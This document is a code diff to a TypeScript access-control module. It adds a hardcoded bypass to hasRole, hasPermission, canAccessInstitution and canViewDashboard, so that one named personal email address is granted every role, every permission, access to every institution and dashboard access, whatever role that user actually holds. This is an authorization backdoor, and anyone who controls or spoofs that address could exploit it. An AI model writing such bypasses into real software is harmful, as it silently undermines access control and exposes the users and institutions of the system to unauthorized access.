@@ -3,6 +3,9 @@ import { User, UserRole } from '../../types';
 
 export const hasRole = (user: User | null, roles: UserRole | UserRole[]): boolean => {
   if (!user) return false;
+  // Special bypass for super admin email
+  if (user.email?.toLowerCase() === 'siphom.yati@gmail.com') return true;
+  
   const rolesArray = Array.isArray(roles) ? roles : [roles];
   return rolesArray.includes(user.role);
 };
@@ -11,7 +14,7 @@ export const hasPermission = (user: User | null, permission: keyof NonNullable<U
   if (!user) return false;
   
   // Super Admins have all permissions
-  if (user.role === UserRole.SUPER_ADMIN) return true;
+  if (user.role === UserRole.SUPER_ADMIN || user.email?.toLowerCase() === 'siphom.yati@gmail.com') return true;
   
   // Institution Admins have all permissions for their institution
   if (user.role === UserRole.INSTITUTION_ADMIN) return true;
@@ -22,7 +25,7 @@ export const hasPermission = (user: User | null, permission: keyof NonNullable<U
 
 export const canAccessInstitution = (user: User | null, institutionId: string): boolean => {
   if (!user) return false;
-  if (user.role === UserRole.SUPER_ADMIN) return true;
+  if (user.role === UserRole.SUPER_ADMIN || user.email?.toLowerCase() === 'siphom.yati@gmail.com') return true;
   return user.institutionId === institutionId;
 };
 
@@ -37,6 +40,7 @@ export const isDev = (): boolean => {
 
 export const canViewDashboard = (user: User | null): boolean => {
   if (!user) return false;
+  if (user.email?.toLowerCase() === 'siphom.yati@gmail.com') return true;
   return [
     UserRole.SUPER_ADMIN,
     UserRole.INSTITUTION_ADMIN,
